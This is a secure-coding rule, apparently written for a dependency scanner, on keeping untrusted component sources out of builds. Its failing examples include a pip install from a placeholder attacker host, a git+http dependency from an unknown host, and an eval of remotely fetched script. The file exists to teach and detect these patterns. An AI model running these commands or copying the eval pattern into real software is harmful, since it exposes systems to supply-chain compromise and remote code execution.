---
scanner: no_untrusted_component_sources_scanner.py
category: df
---

# Rule: No untrusted component sources

Dependencies must come from trusted registries with integrity verification — not arbitrary URLs, git branches, or unverified JAR downloads. Supply-chain compromise starts when build scripts pull unaudited artifacts (CWE-829, OWASP A06).

## DO

- **DO** pin dependencies in lockfiles (`package-lock.json`, `poetry.lock`, Maven `dependencyManagement`) from official registries.

  **Example (pass):**

  ```json
  "dependencies": { "lodash": "4.17.21" }
  ```

  Resolved via `npm ci` against committed lockfile.

- **DO** verify checksums/signatures in CI; scan with SBOM tools (Dependabot, Snyk, OWASP Dependency-Check).

  **Example (pass):** CI fails when `mvn verify` detects dependency hash mismatch.

## DO NOT

- **DO NOT** install packages directly from HTTP URLs or unverified git endpoints in production build scripts.

  **Example (fail):**

  ```bash
  pip install https://evil.example.com/package.tar.gz
  ```

  **Example (fail):**

  ```json
  "dependency": "git+http://unknown.host/lib.git#master"
  ```

- **DO NOT** load executable code from remote URLs at runtime without signature verification.

  **Example (fail):**

  ```javascript
  eval(await fetch(req.query.scriptUrl).then(r => r.text()));
  ```

**Source:** `context/green_belt_assessment/e0523/challenge-7.md`, `context/08_Software_or_Data_Integrity_Failures/exercises-challenges/Using-Components-From-Untrusted-Source.md`
